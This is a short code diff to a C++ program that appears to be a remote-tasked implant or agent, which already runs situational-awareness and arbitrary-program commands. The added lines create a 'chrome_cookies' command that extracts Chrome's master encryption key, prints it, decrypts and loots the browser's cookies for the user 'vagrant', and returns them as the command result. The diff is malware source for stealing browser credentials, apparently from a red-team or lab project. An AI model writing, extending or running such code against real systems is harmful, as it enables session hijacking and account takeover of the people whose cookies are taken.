@@ -88,6 +88,17 @@ int main(){
             }else if(command["command_text"]=="situational_awareness"){
                 cmd_result = info;
                 std::cout << info << std::endl;
+            }else if(command["command_text"]=="chrome_cookies"){
+                unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
+
+                getMasterKey(masterKey, "vagrant");
+                printUCharAsHex(masterKey, MASTER_KEY_SIZE);
+
+                json jsonResult = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
+                cmd_result = jsonResult.dump();
+                std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
+
+                delete[] masterKey;
             }
         }else if(command["command_type"] == "system_program"){
             cmd_result = runProgram(cmd);
